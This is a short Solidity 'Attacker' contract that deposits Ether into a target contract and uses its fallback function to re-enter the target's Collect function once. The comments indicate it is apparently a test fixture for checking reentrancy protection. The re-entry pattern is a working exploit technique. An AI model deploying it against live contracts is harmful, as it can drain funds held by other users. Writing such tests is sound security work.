// Minimal attacker that re-enters Collect during receive/fallback
contract Attacker {
    C immutable target;
    bool public attacked;

    constructor(address _t) {
        target = C(_t);
        attacked = false;
    }

    // deposit via fallback of C: contract C's fallback calls Put(0) on itself, but here we need to call Put
    function doPut(uint256 lockTime) external payable {
        // call Put on target to register balance and unlockTime
        // we send Ether with the call
        target.Put{value: msg.value}(lockTime);
    }

    // receive funds from Collect; try to re-enter Collect once
    fallback() external payable {
        if (!attacked) {
            attacked = true;
            // attempt to re-enter Collect to exploit lack of nonReentrant_
            // use a small amount (0) or the contract's balance if available
            uint256 bal = address(this).balance;
            // avoid revert by bounding
            uint256 toCollect = bal > 0 ? 1 : 0;
            // If Collect reverts, ignore — the test will observe MinSum unchanged in correct contract
            try target.Collect(toCollect) {
            } catch {
            }
        }
    }
}

